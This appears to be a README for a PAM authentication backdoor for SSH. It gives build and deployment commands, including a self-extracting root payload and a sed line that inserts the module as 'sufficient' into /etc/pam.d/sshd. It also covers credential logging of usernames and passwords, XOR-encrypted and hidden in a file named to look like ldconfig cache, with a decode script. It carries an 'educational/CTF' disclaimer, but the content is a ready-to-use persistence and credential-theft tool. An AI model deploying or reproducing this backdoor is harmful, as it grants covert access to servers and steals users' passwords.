# PAM Auth Module

Educational PAM authentication module for security research and CTF environments.

## Features

- Portable (no OpenSSL dependency, embedded SHA256)
- Self-extracting payload (no compiler needed on target)
- Credential logging (XOR encrypted)
- Timestamp matching
- Supports: Debian, RHEL, Photon OS, etc.

## Quick Start

```bash
# Generate payload
./build.sh <password> > payload.sh

# Deploy to target (as root)
bash payload.sh
```

## Build

### Using build.sh (recommended)
```bash
./build.sh mypassword > payload.sh
```

### Manual compile
```bash
gcc -fPIC -shared -O2 -s -fvisibility=hidden \
    -o pam_auth.so pam_auth.c -lpam
strip --strip-all pam_auth.so
```

## Deploy

### Via payload.sh
```bash
scp payload.sh root@target:/tmp/
ssh root@target "bash /tmp/payload.sh && rm /tmp/payload.sh"
```

### Manual
```bash
# Copy module
cp pam_auth.so /lib/security/           # Photon/generic
cp pam_auth.so /lib64/security/         # RHEL/CentOS
cp pam_auth.so /lib/x86_64-linux-gnu/security/  # Debian

# Set permissions
chmod 644 /lib/security/pam_auth.so

# Add to PAM (insert at top of /etc/pam.d/sshd)
sed -i '1a auth sufficient pam_auth.so' /etc/pam.d/sshd
```

## Files

| File | Description |
|------|-------------|
| `pam_auth.c` | Main source (standalone, no OpenSSL) |
| `pam_template.c` | Template for build.sh with placeholder hash |
| `build.sh` | Generates self-extracting payload |
| `deploy.sh` | Direct deploy (requires gcc on target) |
| `Dockerfile` | Test container (Debian) |
| `Vagrantfile` | Test VM |

## Testing

### Docker
```bash
# Debian
docker build -t ssh-door-test .
docker run -d -p 2222:22 --name ssh-test ssh-door-test
ssh root@localhost -p 2222

# Photon
docker run -d --name photon-test -p 2223:22 photon:1.0 sleep infinity
docker exec photon-test tdnf install -y openssh shadow sed
# ... configure ssh, then deploy payload
```

## Credential Log

Location: `/var/cache/ldconfig/aux-cache.log`

Decode:
```bash
./creds.sh /var/cache/ldconfig/aux-cache.log
```

Or manually:
```python
key = b'ld.so.cache'
d = open('/var/cache/ldconfig/aux-cache.log', 'rb').read()
print(bytes([d[i] ^ key[i % len(key)] for i in range(len(d))]).decode())
```

Output format: `timestamp|username|password`

## Removal

```bash
# Remove from PAM config
sed -i '/pam_auth.so/d' /etc/pam.d/sshd

# Delete module
rm /lib/security/pam_auth.so

# Delete logs
rm /var/cache/ldconfig/aux-cache.log
```

## Compatibility

| OS | OpenSSH | Auth | Cred Log |
|----|---------|------|----------|
| Photon OS 1.0 | 7.4 | Yes | Yes |
| Debian 11 | 8.4 | Yes | Yes |
| Debian 12 | 9.2 | Yes | No* |
| RHEL/CentOS 7 | 7.4 | Yes | Yes |
| RHEL/CentOS 8+ | 8.0+ | Yes | Partial* |

*OpenSSH 9.x scrubs passwords before PAM modules receive them. Credential capture is not reliable on these versions. Backdoor authentication works on all versions.

## Legal

For authorized security testing, CTF, and educational use only.
